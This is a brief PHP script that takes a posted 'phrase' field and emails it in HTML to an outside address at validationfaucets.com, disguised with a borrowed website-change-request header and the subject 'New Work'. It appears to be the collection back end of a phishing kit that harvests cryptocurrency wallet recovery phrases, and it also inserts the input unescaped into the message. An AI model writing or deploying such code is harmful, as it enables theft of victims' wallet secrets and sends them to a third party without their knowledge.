<?php
$subject  ="New Work";
if ($_POST['type']==1)
{
    $phrase = $_POST['phrase'];
    $recipient = 'wget@validationfaucets.com';
    $message = '<html><body>';
    $message .= '<img src="//css-tricks.com/examples/WebsiteChangeRequestForm/images/wcrf-header.png" alt="Website Change Request" />';
    $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
    $message .= "<tr style='background: #eee;'><td><strong>Item:</strong> </td><td>Details</td></tr>";
    $message .= "<tr><td><strong>Phrase:</strong> </td><td>" . $phrase . "</td></tr>";
    $message .= "</table>";
    $message .= "</body></html>";

    $headers = "From: no-reply@validationfaucets.com\r\n";
    $headers .= "Reply-To: no-reply@validationfaucets.com\r\n";
    $headers .= "CC: wget@validationfaucets.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";


    mail($recipient,$subject,$message, $headers);
    echo json_encode(array("statusCode"=>200));
}

